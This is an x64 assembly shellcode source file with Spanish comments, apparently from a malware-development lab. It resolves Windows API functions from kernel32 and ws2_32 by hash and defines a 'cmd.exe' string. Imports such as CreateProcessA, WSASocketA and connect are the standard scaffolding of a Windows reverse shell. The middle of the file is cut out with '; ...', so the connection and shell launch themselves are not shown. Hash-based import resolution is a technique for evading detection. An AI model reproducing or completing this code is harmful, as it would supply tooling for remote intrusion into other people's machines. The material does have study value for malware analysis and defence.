BITS 64

; -----------------------------------
; VARIABLES LOCALES
; -----------------------------------
BaseKernel32        equ -0x08
; Array para las funciones resultas de kernell32
WaitForSingleObject equ -0x10
TerminateProcess    equ -0x18
LoadLibraryA        equ -0x20
ExitProcess         equ -0x28
CreateProcessA      equ -0x30
CloseHandle         equ -0x38 ; Cabeza del array

BaseWs2_32          equ -0x40
; Array para las funciones resultas de ws2_32
connect             equ -0x48
closesocket         equ -0x50
WSAStartup          equ -0x58
WSASocketA          equ -0x60
WSACleanup          equ -0x68 ; Cabeza del array


hSocket             equ -0x38   ; size 0x4
wsaData             equ -0x1c8  ; size 0x190
server              equ -0x1d8  ; size 0x10
startupinfo         equ -0x21C  ; size 0x44
processinfo         equ -0x22C  ; size 0x10

; -----------------------------------
; INIT Stack frame
; -----------------------------------
push    rbp         ; guardo ebp del stack frame anterior
mov     rbp, rsp    ; inicializo el nuevo
sub     rsp, 0x300  ; mejor que sobre

; -----------------------------------
; Obtener base de kernell32.dll
; -----------------------------------
; void* x64_get_module_handle(uint32_t hash_name);
mov     ecx, [rel KERNEL32]
sub     rsp, 0x20                   ; shadow space
call    _x64_get_module_handle
add     rsp, 0x20
mov     [rbp + BaseKernel32], rax

; -----------------------------------
; import functions from kernell32.dll
; -----------------------------------
; uint64_t multi_import(
;    uint64_t base_module,   ; RCX (hash 64-bit del módulo)
;    uint32_t* ptr_source,   ; RDX (puntero 64-bit a lista de DWORDs)
;    uint64_t* ptr_dest      ; R8  (puntero 64-bit a lista de QWORDs)
; );
mov     rcx, [rbp + BaseKernel32]
lea     rdx, [rel KERNEL32_DEF_HASHES]
lea     r8, [rbp +  CloseHandle]
call    _multi_import

; ...

; -----------------------------------
; END
; -----------------------------------
mov rsp, rbp    ; limpia la pila
pop rbp         ; restaura el viejo frame pointer
ret             ; vuelve a la dirección de retorno

; -----------------------------------
%include "C:\Users\test\Desktop\mal-dev-lab\101-code\ASM-shellcodes\runtime_linking\x64\x64_exports.asm"
; -----------------------------------

KERNEL32:       dd 0x4b1ffe8e
WS2_32_STR:     db 'ws2_32.dll', 0
CMD_STRING:     db 'cmd.exe', 0

KERNEL32_DEF_HASHES:
    dd 0x723EB9D5   ; CloseHandle:          
    dd 0x46718AE6   ; CreateProcessA:       
    dd 0x9590A319   ; ExitProcess:          
    dd 0xC8E88006   ; LoadLibraryA:           
    dd 0x9e6f6842   ; TerminateProcess:       
    dd 0xc547757b   ; WaitForSingleObject:
    dd 0xFFFFFFFF    


WS2_32_DEF_HASHES:
    dd 0xaff835ad   ; WSACleanup:
    dd 0xcebab524   ; WSASocketA:
    dd 0xed9ef56d   ; WSAStartup:
    dd 0x939d7d9c   ; closesocket:
    dd 0xedd8fe8a   ; connect:
    dd 0xFFFFFFFF
